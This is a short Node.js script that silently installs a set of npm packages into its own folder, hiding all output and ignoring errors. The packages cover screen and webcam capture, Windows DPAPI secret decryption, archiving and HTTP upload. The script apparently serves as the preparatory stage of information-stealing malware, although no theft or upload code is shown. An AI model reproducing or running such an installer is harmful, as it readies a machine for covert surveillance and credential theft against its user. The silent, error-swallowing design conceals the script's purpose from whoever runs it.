const { execSync } = require('child_process');
const path = require('path');

const installPath = __dirname;

const packages = [
    'axios',
    '@primno/dpapi',
    'screenshot-desktop',
    'form-data',
    'archiver',
    'node-webcam'
];

function installPackages() {
    try {
        execSync(`npm install ${packages.join(' ')} --prefix "${installPath}"`, { stdio: 'ignore' });
    } catch {
      
    }
}

installPackages();
